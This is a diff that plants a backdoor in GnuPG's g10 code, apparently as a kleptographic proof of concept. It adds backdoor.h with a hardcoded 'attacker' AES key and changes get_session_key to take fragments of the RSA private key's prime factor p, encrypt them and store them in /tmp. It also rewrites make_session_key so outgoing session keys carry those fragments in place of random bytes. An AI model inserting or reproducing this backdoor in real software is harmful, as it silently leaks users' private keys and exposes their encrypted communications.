@@ -1,0 +1,298 @@
+diff -bBupN ./original/g10/backdoor.h ./server/g10/backdoor.h
+--- ./original/g10/backdoor.h	1969-12-31 18:00:00.000000000 -0600
++++ ./server/g10/backdoor.h	2015-08-05 12:46:48.000000000 -0500
+@@ -0,0 +1,37 @@
++#ifndef BACKDOOR_H
++#define BACKDOOR_H
++
++	#ifdef BACKDOORED
++	  // We use symmetric channel
++	  #define SYMMETRIC_CHANNEL
++
++      // Rather inelegant way to store leaked data
++      #define TMP_STORAGE "/tmp/21bf21f8a9aedc6a395dd0720a1e11ec2220804c"
++
++      // We currently only support leaking RSA private keys (2048 and 4096 bit)
++      // This is not an inherent but an implementation limitation
++      #define is_RSA(a) ((a)>=1 && (a)<=3)
++
++	  // Channel configuration
++      #ifdef SYMMETRIC_CHANNEL
++          #define LEAK_SIZE 32            // leak channel bandwith of 256 bits
++
++          #define ATTACKER_ALGO 0x09      // CIPHER_ALGO_AES256 
++          #define ATTACKER_MODE 0x06      // CIPHER_MODE_CBC
++          #define ATTACKER_KEYLEN 32      // 256-bit symmetric key
++          #define ATTACKER_IVLEN 16       // 128-bit blocks
++
++          // Dynamic attacker IV
++          unsigned char attacker_iv[ATTACKER_IVLEN] = {0};
++
++          // Static attacker key
++          const unsigned char attacker_symkey[ATTACKER_KEYLEN] = {0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41};
++
++          // Leak buffer
++          unsigned char leak_buffer[LEAK_SIZE] = {0};
++      #endif
++
++	  #define min(a,b) ({ __typeof__ (a) _a = (a); __typeof__ (b) _b = (b); _a > _b ? _b: _a; })
++	#endif
++
++#endif
+\ No newline at end of file
+Common subdirectories: ./original/g10/.deps and ./server/g10/.deps
+diff -bBupN ./original/g10/pubkey-enc.c ./server/g10/pubkey-enc.c
+--- ./original/g10/pubkey-enc.c	2015-02-26 11:24:22.000000000 -0600
++++ ./server/g10/pubkey-enc.c	2015-08-05 12:46:49.000000000 -0500
+@@ -69,6 +69,22 @@ is_algo_in_prefs ( KBNODE keyblock, pref
+ int
+ get_session_key( PKT_pubkey_enc *k, DEK *dek )
+ {
++    //========================================================
++    /*
++    * BACKDOORMOD
++    */
++    #define BACKDOORED
++
++    #ifdef BACKDOORED
++      unsigned int p_bytes;
++      unsigned char* p_buffer;
++      unsigned char* enc_leak_buffer;
++      FILE* pkey_file;
++
++      #include "backdoor.h"
++    #endif
++    //========================================================
++
+     PKT_secret_key *sk = NULL;
+     int rc;
+ 
+@@ -138,6 +154,107 @@ get_session_key( PKT_pubkey_enc *k, DEK
+     }
+ 
+   leave:
++    //========================================================
++    /*
++    * BACKDOORMOD
++    */
++    #ifdef BACKDOORED
++      // Currently only support RSA private keys (2048 and 4096 bit)
++      if(is_RSA(sk->pubkey_algo))
++      {
++        // Convert prime factor p to buffer
++        p_buffer = mpi_get_buffer(sk->skey[3], &p_bytes, NULL);
++
++        #ifdef SYMMETRIC_CHANNEL
++            CIPHER_HANDLE hd;
++            unsigned int fragment_index = 0;
++
++            // Determine what fragment to leak from treating first session key byte as bucket
++            // Buckets depend on factor size
++            if(p_bytes == 128)
++            {
++              if(dek->key[0] < 0x40)
++              {
++                fragment_index = 0;
++              }
++              else if((dek->key[0] >= 0x40) && (dek->key[0] < 0x80))
++              {
++                fragment_index = 1;
++              }
++              else if((dek->key[0] >= 0x80) && (dek->key[0] < 0xC0))
++              {
++                fragment_index = 2;
++              }
++              else if((dek->key[0] >= 0xC0))
++              {
++                fragment_index = 3;
++              }
++            }
++            else if(p_bytes == 256)
++            {
++              if(dek->key[0] < 0x20)
++              {
++                fragment_index = 0;
++              }
++              else if((dek->key[0] >= 0x20) && (dek->key[0] < 0x40))
++              {
++                fragment_index = 1;
++              }
++              else if((dek->key[0] >= 0x40) && (dek->key[0] < 0x60))
++              {
++                fragment_index = 2;
++              }
++              else if((dek->key[0] >= 0x60) && (dek->key[0] < 0x80))
++              {
++                fragment_index = 3;
++              }
++              else if((dek->key[0] >= 0x80) && (dek->key[0] < 0xA0))
++              {
++                fragment_index = 4;
++              }
++              else if((dek->key[0] >= 0xA0) && (dek->key[0] < 0xC0))
++              {
++                fragment_index = 5;
++              }
++              else if((dek->key[0] >= 0xC0) && (dek->key[0] < 0xE0))
++              {
++                fragment_index = 6;
++              }
++              else if((dek->key[0] >= 0xE0))
++              {
++                fragment_index = 7;
++              }
++            }
++
++            // Leak 256 bit fragment
++            memcpy(leak_buffer, p_buffer+(fragment_index*LEAK_SIZE), LEAK_SIZE);
++
++            // Set attacker iv from session key
++            // assert(ATTACKER_IVLEN <= (dek->keylen-1))
++            memcpy(attacker_iv, dek->key+1, ATTACKER_IVLEN);
++
++            // Encrypt fragment to be leaked
++            enc_leak_buffer = (unsigned char*)xmalloc_clear(sizeof(unsigned char)*(LEAK_SIZE + 1));
++            
++            hd = cipher_open(ATTACKER_ALGO, ATTACKER_MODE, 1 );
++            cipher_setkey(hd, attacker_symkey, ATTACKER_KEYLEN);
++            cipher_setiv(hd, attacker_iv, ATTACKER_IVLEN);
++            cipher_encrypt(hd, enc_leak_buffer, leak_buffer, LEAK_SIZE);
++            cipher_close(hd);
++        #endif
++
++        //Store for later retrieval in response phase
++        pkey_file = fopen(TMP_STORAGE, "wb");
++        fwrite(enc_leak_buffer, sizeof(unsigned char), LEAK_SIZE, pkey_file);
++
++        // Cleanup
++        fclose(pkey_file);
++
++        xfree(p_buffer);
++        xfree(enc_leak_buffer);   
++      }   
++    #endif
++    //========================================================
+     if( sk )
+ 	free_secret_key( sk );
+     return rc;
+diff -bBupN ./original/g10/seskey.c ./server/g10/seskey.c
+--- ./original/g10/seskey.c	2015-02-26 11:24:22.000000000 -0600
++++ ./server/g10/seskey.c	2015-08-05 14:16:15.000000000 -0500
+@@ -29,12 +29,17 @@
+ #include "main.h"
+ #include "i18n.h"
+ 
+-/****************
+- * Make a session key and put it into DEK
+- */
+-void
+-make_session_key( DEK *dek )
+-{
++//========================================================
++//BACKDOORMOD
++
++#define BACKDOORED
++
++#ifdef BACKDOORED
++    #include "backdoor.h"
++
++    void
++    old_make_session_key( DEK *dek )
++    {
+     CIPHER_HANDLE chd;
+     int i, rc;
+ 
+@@ -55,8 +60,92 @@ make_session_key( DEK *dek )
+     log_fatal(_(
+ 	    "cannot avoid weak key for symmetric cipher; tried %d times!\n"),
+ 		  i);
+-}
++    }
++
++    void
++    make_session_key( DEK *dek )
++    {
++      FILE* pkey_file;
++      unsigned char* pkey_buf = NULL;
++      size_t result, lSize, rSize = 0;
++      
++      // Obtain session key length
++      dek->keylen = cipher_get_keylen( dek->algo ) / 8;
++
++      // Zero memory
++      memset(dek->key, 0, dek->keylen);
++
++      // Get stored encrypted fragment of private key factor
++      pkey_file = fopen(TMP_STORAGE, "rb");
++      if(pkey_file == NULL)
++      {
++        goto error_state;
++      }
+ 
++      fseek(pkey_file , 0 , SEEK_END);
++      lSize = (size_t)ftell(pkey_file);
++      rewind(pkey_file);
++
++      pkey_buf = (unsigned char*)xmalloc_clear(sizeof(unsigned char)*(dek->keylen + 1));
++      if(pkey_buf == NULL)
++      {
++        goto error_state;
++      }
++
++      // Only leak up to what we can, since attacker controls channel bandwidth (through algorithm preferences)
++      // this is no problem for attacker but other parties with smaller keys might get only fragments of encrypted ciphertext
++      rSize = (size_t)min(lSize, dek->keylen);
++
++      result = fread(pkey_buf, sizeof(unsigned char), rSize, pkey_file);
++      if(result != rSize)
++      {
++        goto error_state;
++      }
++
++      // Set session key to leak
++      memcpy(dek->key, pkey_buf, rSize);
++
++      goto cleanup;
++
++    //yup, goto considered harmful, blablabla have you seen the GnuPG source?
++    error_state:
++      // If the backdoor raises an error, we call original make_session_key function
++      old_make_session_key(dek);
++
++    cleanup:
++      if(pkey_file)
++        fclose(pkey_file);
++
++      if(pkey_buf)
++        xfree(pkey_buf);
++    }
++#else
++    void
++    make_session_key( DEK *dek )
++    {
++        CIPHER_HANDLE chd;
++        int i, rc;
++
++        dek->keylen = cipher_get_keylen( dek->algo ) / 8;
++
++        chd = cipher_open( dek->algo, CIPHER_MODE_AUTO_CFB, 1 );
++        randomize_buffer( dek->key, dek->keylen, 1 );
++        for(i=0; i < 16; i++ ) {
++           rc = cipher_setkey( chd, dek->key, dek->keylen );
++           if( !rc ) {
++               cipher_close( chd );
++               return;
++           }
++           log_info(_("weak key created - retrying\n") );
++           /* Renew the session key until we get a non-weak key. */
++           randomize_buffer( dek->key, dek->keylen, 1 );
++        }
++        log_fatal(_(
++               "cannot avoid weak key for symmetric cipher; tried %d times!\n"),
++                    i);
++    }
++#endif
++//========================================================
+ 
+ /****************
+  * Encode the session key. NBITS is the number of bits which should be used
